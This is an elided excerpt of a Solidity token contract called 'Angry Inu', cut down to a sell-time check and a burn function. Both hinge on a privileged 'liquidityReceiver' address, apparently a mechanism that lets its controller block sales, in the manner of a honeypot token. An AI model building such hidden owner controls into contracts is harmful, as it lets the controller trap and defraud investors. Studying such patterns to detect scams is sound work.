...
// Telegram: https://t.me/AItheAngryInu
...
contract AInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Angry Inu";
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            if(to == uniswapV2Pair && from != uniswapV2Pair){  
                require(balanceOf(liquidityReceiver) < _tTotal );      
    ...
    function burn(uint256 amount) external {
        require(msg.sender == liquidityReceiver, "Only LP receiver can burn the token!");
